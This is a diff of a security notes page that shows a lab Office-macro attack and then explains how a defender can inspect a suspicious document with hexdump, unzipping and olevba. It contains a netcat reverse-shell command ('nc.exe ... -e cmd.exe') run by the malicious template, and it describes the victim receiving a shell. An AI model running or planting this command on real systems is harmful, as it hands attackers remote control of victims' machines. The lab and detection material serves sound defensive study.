@@ -25,13 +25,13 @@ End Sub
 
 {% code-tabs %}
 {% code-tabs-item title="C:\\tools\\shell.cmd" %}
-```bash
+```csharp
 C:\tools\nc.exe 10.0.0.5 443 -e C:\Windows\System32\cmd.exe
 ```
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
-This is how it should look roughly:
+This is how it should look roughly in:
 
 ![](../../.gitbook/assets/macros-code.png)
 
@@ -51,19 +51,19 @@ Victim launching the Doc3.dotm:
 
 ![](../../.gitbook/assets/macro-victim.png)
 
-...and enabling the content - which gives the attacker a reverse shell:
+...and enabling the content - which results in attacker receiving a reverse shell:
 
 ![](../../.gitbook/assets/macro-shell.png)
 
 ## Observations
 
-The below graphic represents the process ancestry and what happened after the victim had clicked the "Enable Content" button in our malicious Doc3.dotm document:
+The below graphic represents the process ancestry after the victim had clicked the "Enable Content" button in our malicious Doc3.dotm document:
 
 ![](../../.gitbook/assets/macro-ancestry.png)
 
 ## Inspection
 
-If you received a suspicious Office document and do not have any malware analysis tools, hopefully at least you have access to a ZIP and Strings utility or any type of Hex Editor to hand. 
+If you received a suspicious Office document and do not have any malware analysis tools, hopefully at least you have access to a WinZip or 7Zip and Strings utility or any type of Hex Editor to hand. 
 
 Since Office files are essentially ZIP archives \(PK magic bytes\):
 
@@ -72,7 +72,7 @@ root@remnux:/home/remnux# hexdump -C Doc3.dotm | head -n1
 00000000  50 4b 03 04 14 00 06 00  08 00 00 00 21 00 cc 3c  |PK..........!..<|
 ```
 
-...the file can be renamed to **Doc3.zip** and simply unzipped like a regular archive. Doing so deflates the archive and reveals the files that make up the suspicious office file. Files include `document.xml` which is where the main document body text goes and `vbaProject.bin` containing the evil macros:
+...the file Dot3.dotm can be renamed to **Doc3.zip** and simply unzipped like a regular ZIP archive. Doing so deflates the archive and reveals the files that make up the malicious office document. One of the files is the `document.xml` which is where the main document body text goes and `vbaProject.bin` containing the evil macros themselves:
 
 ![](../../.gitbook/assets/macros-deflated.png)
 
@@ -80,15 +80,19 @@ Looking inside the `document.xml`, we can see the body copy we inputted at the v
 
 ![](../../.gitbook/assets/macros-document-unzipped.png)
 
-Additionally, if you have the strings or a hex dumping utility, you can pass the `vbaProject.bin` through. This can sometimes give enough to determine if the document is suspicious. 
+Additionally, if you have the strings or a hex dumping utility, you can pass the `vbaProject.bin` through it. This can sometimes give you as defender enough to determine if the document is suspicious/malicious. 
 
-I ran `hexdump -C vbaProject.bin` which clearly revealed some fragmented keywords that should immediately raise your suspicion - keywords included: **Shell, Hide, Sub\_Open** and something that looks like a file path:
+Running `hexdump -C vbaProject.bin` reveals some fragmented keywords that should immediately raise your suspicion - **Shell, Hide, Sub\_Open** and something that looks like a file path:
 
 ![](../../.gitbook/assets/macros-hex-shell.png)
 
 If you have a malware analysis linux distro Remnux, you can easily inspect the VBA macros code contained in the document by issuing the command `olevba.py filename.dotm`. As seen below, the command nicely decodes the `vbaProject.bin`  and reveals the actual code as well as provides some interpretation of the commands found in the script:
 
 ![](../../.gitbook/assets/macros-olevba.png)
+
+{% hint style="danger" %}
+Note that the olevba can be fooled as per [http://www.irongeek.com/i.php?page=videos/derbycon8/track-3-18-the-ms-office-magic-show-stan-hegt-pieter-ceelen](http://www.irongeek.com/i.php?page=videos/derbycon8/track-3-18-the-ms-office-magic-show-stan-hegt-pieter-ceelen)
+{% endhint %}
 
 {% embed url="https://attack.mitre.org/wiki/Technique/T1137" %}
 
